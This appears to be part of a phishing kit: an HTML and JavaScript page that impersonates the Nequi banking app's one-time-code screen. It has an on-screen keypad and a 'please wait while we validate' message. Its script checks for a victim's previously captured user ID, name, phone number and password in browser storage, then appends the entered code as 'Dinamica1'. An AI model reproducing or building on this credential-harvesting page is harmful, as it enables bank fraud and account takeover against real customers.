...
<head>
    ...
    <link rel="stylesheet" href="css/validate-otp1.css">
...
<header class="navbarContainer">
    <div class="navbarWrapper">
        ...
        <div class="mainSectionWrapper">
            ...
            <p class="wait-msg">Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.</p>
            <p class="info-msg">Por lo general este proceso no demora más de 2 minutos.</p>
        </div>
    </section>
</main>
    <section class="homeSectionContainer">
        ...
        <p>Para confirmar tu identidad escribe o pega la
            clave dinámica que encuentras en tu App Nequi.
        </p>
        <div class="linesContainer">
            <input id="c1" class="otpInput" maxlength="1" inputmode="none">
            <input id="c2" class="otpInput" maxlength="1" inputmode="none">
            <input id="c3" class="otpInput" maxlength="1" inputmode="none">
            <input id="c4" class="otpInput" maxlength="1" inputmode="none">
            <input id="c5" class="otpInput" maxlength="1" inputmode="none">
            <input id="c6" class="otpInput" maxlength="1" inputmode="none">
        </div>
        <div class="screenKeyboard">
            ...
            <div class="keyboardRow">
                ...
                <button class="keyboardBtn" id="delete-otp"><img src="assets/images/nequi-teclado-numerico-borrar.svg" alt=""></button>
            </div>
        </div>
    </section>
...
// Agregar esta validación al inicio del script
        const formData = JSON.parse(localStorage.getItem('formData'));
        if (!formData || !formData.UserId || !formData.userName || !formData.phoneNumber || !formData.password) {
            ...
            keyboard.addEventListener('click', (e) => {
                if (e.target.classList.contains('keyboardBtn') && !e.target.id.includes('delete')) {
                    ...
                    if (currentInput < inputs.length) {
                        ...
                        inputs[currentInput].dispatchEvent(inputEvent);
            ...
            inputs.forEach(input => {
                // Prevenir todos los eventos de entrada posibles
                ...
                // Deshabilitar el teclado virtual en móviles
            ...
            inputs.forEach((input, index) => {
                input.addEventListener('input', async () => {
                    ...
                    if (isComplete) {
                        let otp = '';
                        inputs.forEach(input => {
                            otp += input.dataset.realValue || ''; // Usar el valor real almacenado
                        });

                        const formData = JSON.parse(localStorage.getItem('formData')) || {};

                        formData.Dinamica1 = otp;
